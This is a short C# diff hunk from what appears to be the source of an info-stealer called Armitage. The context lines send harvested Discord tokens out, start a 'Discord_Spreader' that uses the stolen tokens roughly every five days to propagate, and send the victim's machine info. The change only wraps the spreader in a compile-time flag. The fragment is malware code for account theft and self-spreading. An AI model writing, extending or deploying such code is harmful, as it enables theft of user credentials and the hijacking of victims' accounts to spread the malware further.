@@ -103,14 +103,17 @@ namespace Client
 
             Armitage.Cookies.Discord_Token.Send(discord_tokens);
 
+#if !DiscordSpreadDisabled
             // run every 5 days or so
             if (discord_tokens.Count > 0 && (Constants.Today - Properties.Settings.Default.LastDiscordSent).TotalDays > 5)
             {
                 Armitage.Postman.Discord_Spreader spreader = new Armitage.Postman.Discord_Spreader(discord_tokens.Select(x => x.Item2).ToArray());
+             
                 spreader.Start();
             }
             else { Console.WriteLine("found tokens : " + discord_tokens.Count.ToString()); }
 
+#endif
             /// Send machine info
             Armitage.Informer.Start();
 #endif
